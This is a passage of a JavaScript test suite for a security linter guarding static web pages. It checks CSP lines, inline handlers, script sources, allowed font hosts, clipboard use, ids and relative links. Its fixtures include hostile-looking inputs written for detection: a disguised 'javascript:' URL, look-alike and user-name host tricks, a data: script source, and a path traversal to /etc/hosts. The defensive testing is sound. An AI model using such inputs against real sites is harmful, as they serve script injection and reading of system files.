  // a call in a comment or in a sentence is not a call
  assert.equal(savedPackageProblems("x.js", page("go()") + "// " + good + "\nconst say = \"" + good.replace(/[`$]/g, "") + "\";\n").length, 1);
});

test("self-test: the clipboard is allowed once, in the sky page's shell, and only as writeText", () => {
  const copy = "btn.onpress = () => { navigator.clipboard.writeText(url).then(done, failed); };\n";
  assert.deepEqual(forbiddenIn(SKY_SHELL, copy), []);
  assert.deepEqual(names(forbiddenIn(SKY_SHELL, copy + copy)), ["the clipboard outside the sky page's one copy button"], "a second use in the same file");
  assert.equal(forbiddenIn(SKY_SHELL, copy + copy)[0].split(":")[1], "2", "and it is the second that is reported");
  assert.equal(forbiddenIn(`${PAGES[1].dir}/lexicon-explorer.js`, copy).length, 1, "the other page has none");
  assert.equal(forbiddenIn(`${PAGES[0].dir}/celestial-chart.js`, copy).length, 1, "nor has another script of the sky page");
  assert.equal(forbiddenIn(KIT, copy).length, 1, "nor has the kit");
  assert.deepEqual(names(forbiddenIn(SKY_SHELL, "const t = await navigator.clipboard.readText();\n")), ["the clipboard read, or written with anything but writeText"], "reading is never allowed");
});

test("self-test: forbidden names in a page file, outside its comments", () => {
  assert.deepEqual(names(forbiddenIn("p.html", "<p>a</p>\n<iframe srcdoc=\"x\"></iframe>\n")), ["srcdoc"]);
  assert.deepEqual(forbiddenIn("p.html", "<p>a</p>\n<!-- no srcdoc,\n no innerHTML -->\n<p>We do not fetch (anything).</p>\n"), []);
  assert.equal(forbiddenIn("p.html", `<!-- nothing goes to local${STORE} -->\n`).length, 1, "the storage names are caught in comments too");
});

const GOOD_PAGE = [
  "<!DOCTYPE html>",
  "<html lang=\"en\">",
  "<head>",
  `<meta http-equiv="Content-Security-Policy" content="${POLICY}">`,
  "<meta charset=\"UTF-8\">",
  "<title>A page</title>",
  "<link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">",
  "<link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>",
  "<link href=\"https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap\" rel=\"stylesheet\">",
  "<link rel=\"stylesheet\" href=\"../explorer-kit.css\">",
  "<style>.x { color: red; }</style>",
  "</head>",
  "<body>",
  "<!-- a comment -->",
  "<p id=\"say\" title=\"turn on = off, onclick=1\" data-on=\"1\">Come on = in. Read on.</p>",
  "<canvas id=\"cv\"></canvas>",
  "<script type=\"module\" src=\"./page.js\"></script>",
  "</body>",
  "</html>",
  "",
].join("\n");
const swap = (from, to) => { assert.ok(GOOD_PAGE.includes(from), "the self-test's sample page changed"); return GOOD_PAGE.replace(from, to); };

test("self-test: a sound page passes every page rule", () => {
  for (const [title, rule] of PAGE_RULES) assert.deepEqual(rule("p.html", GOOD_PAGE), [], title);
});

test("self-test: the content policy rule fails on a missing, late or altered line", () => {
  const line = `<meta http-equiv="Content-Security-Policy" content="${POLICY}">\n`;
  assert.equal(policyProblems("p.html", swap(line, "")).length, 1, "missing");
  assert.equal(policyProblems("p.html", swap(line + "<meta charset=\"UTF-8\">\n", "<meta charset=\"UTF-8\">\n" + line)).length, 1, "after another element");
  assert.equal(policyProblems("p.html", swap("connect-src 'none'", "connect-src 'self'")).length, 1, "one word changed");
  assert.equal(policyProblems("p.html", swap("script-src 'self';", "script-src 'self' 'unsafe-inline';")).length, 1, "inline script allowed");
  assert.equal(policyProblems("p.html", swap("form-action 'none'\"", "form-action 'none'; \"")).length, 1, "one character added");
  assert.equal(policyProblems("p.html", "<html><body><p>no head</p></body></html>").length, 1, "no head");
  assert.deepEqual(policyProblems("p.html", swap("<head>\n", "<head>\n<!-- a comment may come first -->\n")), []);
});

test("self-test: the handler rule fails on any on… attribute", () => {
  assert.equal(handlerProblems("p.html", swap("<canvas id=\"cv\">", "<canvas id=\"cv\" onclick=\"go()\">")).length, 1);
  assert.equal(handlerProblems("p.html", swap("<body>", "<body ONLOAD = 'go()'>")).length, 1);
  assert.equal(handlerProblems("p.html", swap("<canvas id=\"cv\">", "<canvas id=\"cv\" onpointerdown=go>")).length, 1);
  assert.equal(handlerProblems("p.html", swap("<canvas id=\"cv\">", "<canvas id=\"cv\"\n  onwheel>")).length, 1);
});

test("self-test: the script rule fails on none, two, inline, classic and non-relative scripts", () => {
  const good = "<script type=\"module\" src=\"./page.js\"></script>";
  const bad = [
    ["none", ""],
    ["two", good + "\n" + good],
    ["inline", "<script type=\"module\">go();</script>"],
    ["module with text", "<script type=\"module\" src=\"./page.js\">go();</script>"],
    ["a second, inline one", good + "\n<script>go();</script>"],
    ["classic", "<script src=\"./page.js\"></script>"],
    ["no src", "<script type=\"module\"></script>"],
    ["absolute", "<script type=\"module\" src=\"https://fonts.googleapis.com/x.js\"></script>"],
    ["root-relative", "<script type=\"module\" src=\"/scripts/page.js\"></script>"],
    ["protocol-relative", "<script type=\"module\" src=\"//example.org/page.js\"></script>"],
    ["a data: URL", "<script type=\"module\" src=\"data:text/javascript,go()\"></script>"],
  ];
  for (const [what, tag] of bad) assert.ok(scriptProblems("p.html", swap(good, tag)).length >= 1, what);
  assert.deepEqual(scriptProblems("p.html", swap(good, "<script src=\"../Lexicon_Explorer/page.js?v=2\" type=\"module\">\n</script>")), []);
});

test("self-test: the host rule fails on any host but the two font hosts", () => {
  const css = "<link rel=\"stylesheet\" href=\"../explorer-kit.css\">";
  const bad = [
    ["another host", "<link rel=\"stylesheet\" href=\"https://cdn.example.org/x.css\">"],
    ["a font host without TLS", "<link rel=\"stylesheet\" href=\"http://fonts.googleapis.com/css2\">"],
    ["a look-alike host", "<link rel=\"stylesheet\" href=\"https://fonts.googleapis.com.example.org/css2\">"],
    ["a font host as user name", "<link rel=\"stylesheet\" href=\"https://fonts.gstatic.com@example.org/x\">"],
    ["a font host with a port", "<link rel=\"stylesheet\" href=\"https://fonts.gstatic.com:8443/x\">"],
    ["no scheme", "<link rel=\"stylesheet\" href=\"//example.org/x.css\">"],
    ["an image", "<img src=\"https://example.org/x.png\" alt=\"\">"],
    ["a socket", "<a href=\"wss://example.org/\">x</a>"],
    ["in a style sheet", "<style>@import url(//example.org/x.css);</style>"],
    ["in a style attribute", "<p style=\"background: url('//example.org/x.png')\">x</p>"],
    ["in a comment", "<!-- see https://example.org/notes -->"],
    ["in the text", "<p>Read more at https://example.org/more</p>"],
    ["a script URL", "<a href=\"javascript:go()\">x</a>"],
    ["a script URL in disguise", "<a href=\" JaVa\tScript:go()\">x</a>"],
  ];
  for (const [what, tag] of bad) assert.ok(hostProblems("p.html", swap(css, tag)).length >= 1, what);
  assert.deepEqual(hostProblems("p.html", swap(css, "<link rel=\"icon\" href=\"data:,\">\n<a href=\"../First_Explorers/index.html#lens=navigator\">x</a>")), []);
});

test("self-test: the ids rule fails on a literal without its element", () => {
  const page = "<head></head><body><p id=\"say\"></p><canvas id='cv'></canvas><!-- <p id=\"ghost\"></p> --></body>";
  const kit = { path: "kit.js", src: "export const $ = (id) => document.getElementById(id);\n" };
  const run = (src, more = []) => idProblems([{ path: "x.js", src }], page, [{ path: "x.js", src }, kit, ...more]);
  assert.deepEqual(run("const a = $(\"say\"), b = $('cv'), c = K.$(`say`), d = document.getElementById(\"cv\");\n"), []);
  assert.equal(run("const a = $(\"sya\");\n").length, 1, "a misspelt id");
  assert.match(run("\n\nconst a = $(\"sya\");\n")[0], /^x\.js:3: .*"sya"/);
  assert.equal(run("const a = $(\"ghost\");\n").length, 1, "an id that is only in a comment of the page");
  assert.equal(run("const a = document.getElementById(\"sya\");\n").length, 1, "getElementById counts too");
  assert.equal(run("const a = K.$('sya');\n").length, 1, "the kit's $ through a namespace");
  assert.equal(run("const a = $(\"\");\n").length, 1, "an empty id");
  // given by an h() call: here, in another script of the page, nested, or as a prefix
  assert.deepEqual(run("const p = h(\"p\", { id: \"made\" }, \"x\");\nconst a = $(\"made\");\n"), []);
  assert.deepEqual(run("const p = h(\"div\", null, h(\"p\", { class: \"x\", \"id\": 'made' }));\nconst a = $(\"made\");\n"), []);
  assert.deepEqual(run("const a = $(\"made\");\n", [{ path: "y.js", src: "h(\"p\", { id: `made` });\n" }]), []);
  assert.deepEqual(run("const p = h(\"p\", { id: \"e-\" + address });\nconst a = $(\"e-26.1\");\n"), []);
  assert.deepEqual(run("const p = h(\"p\", { id: `step-${n}` });\nconst a = $(\"step-3\");\n"), []);
  // not given: an id elsewhere than in an h() call, in a comment, in a string, or under another prefix
  assert.equal(run("const meta = { id: \"made\" };\nconst a = $(\"made\");\n").length, 1, "an id outside an h() call");
  assert.equal(run("// h(\"p\", { id: \"made\" })\nconst a = $(\"made\");\n").length, 1, "an h() call in a comment");
  assert.equal(run("const s = h(\"p\", null, \"write { id: 'made' } here\");\nconst a = $(\"made\");\n").length, 1, "the words in a string");
  assert.equal(run("const p = h(\"p\", { id: \"e-\" + address });\nconst a = $(\"f-26.1\");\n").length, 1, "another prefix");
  assert.equal(run("const p = h(\"p\", { id: \"\" + address });\nconst a = $(\"anything\");\n").length, 1, "an empty prefix covers nothing");
  // a literal in a comment or a string is not a call
  assert.deepEqual(run("// $(\"sya\")\nconst s = \"$('sya')\";\n"), []);
});

test("self-test: the links rule fails on a missing file, a way out and a URL that is not relative", () => {
  const good = Object.freeze({ a: "../First_Explorers/index.html", b: "../Celestial_Control_Panel/index.html", c: "../Lexicon_Explorer/index.html", d: "../index.html" });
  const all = () => true, never = () => false;
  assert.deepEqual(linkProblems(good, all, never), { problems: [], pending: [] });
  const one = (links, exists = all, pendingOk = never) => linkProblems(Object.freeze(links), exists, pendingOk).problems;
  assert.equal(one({ ...good, d: "../indx.html" }, (rel) => !rel.endsWith("indx.html")).length, 3, "a missing file, from both pages, and the wing index no longer reached");
  assert.ok(one({ ...good, e: "../../../../../../../../etc/hosts" }).length >= 1, "out of the repository");
  assert.equal(one({ ...good, e: "https://example.org/" }).length, 1, "a host");
  assert.equal(one({ ...good, e: "/index.html" }).length, 1, "root-relative");
  assert.equal(one({ ...good, e: "../index.html#lens=navigator" }).length, 1, "a fragment belongs to formatHashWith, not to the table");
  assert.equal(one({ ...good, e: 7 }).length, 1, "not a string");
  assert.equal(one({ a: good.a, b: good.b, d: good.d }).length, 1, "a page dropped from the table");
  assert.equal(linkProblems({ ...good }, all, never).problems.length, 1, "a table that is not frozen");
  // a page that is not written yet is pending, not a failure; anything else that is missing fails
  const lex = `${WING}/Lexicon_Explorer/index.html`;
  assert.deepEqual(linkProblems(good, (rel) => rel !== lex, (rel) => rel === lex), { problems: [], pending: [lex] });
  assert.equal(linkProblems(good, (rel) => rel !== lex, never).problems.length, 2);
  // with the rule's own idea of "not written yet": a page may be, First Explorers and the wing index may not
  const first = `${WING}/First_Explorers/index.html`;
  assert.deepEqual(linkProblems(good, (rel) => rel !== first), { problems: [`LINKS.a = "${good.a}" resolves from ${PAGES[0].dir} to ${first}, which does not exist`, `LINKS.a = "${good.a}" resolves from ${PAGES[1].dir} to ${first}, which does not exist`], pending: [] });
  assert.equal(linkProblems(good, (rel) => rel !== `${WING}/index.html`).problems.length, 2);
  if (!REQUIRE_ALL) assert.deepEqual(linkProblems(good, (rel) => rel !== lex), { problems: [], pending: [lex] });
});

test("self-test: a page file may be missing only until its page has an index.html", () => {
  const sky = PAGES[0], model = `${sky.dir}/${sky.scripts[0]}`, index = `${sky.dir}/${sky.index}`;
  if (REQUIRE_ALL) {
    assert.equal(stateOf(model, () => false), "missing");
    return;
  }
  assert.equal(stateOf(model, () => false), "pending");
  assert.equal(stateOf(index, () => false), "pending");
  assert.equal(stateOf(model, (rel) => rel === index), "missing");
  assert.equal(stateOf(model, () => true), "present");
  assert.equal(stateOf(KIT, () => false), "missing");
  assert.equal(stateOf(`${WING}/First_Explorers/index.html`, () => false), "missing");
  assert.equal(stateOf(`${sky.dir}/not-listed.js`, () => false), "missing");
  for (const core of CORES) assert.equal(stateOf(core, () => false), "missing");
  assert.deepEqual(unlisted(listedOf(sky), [index, `${sky.dir}/extra.js`]), [`${sky.dir}/extra.js`], "a file that is not listed is still found and checked");
});
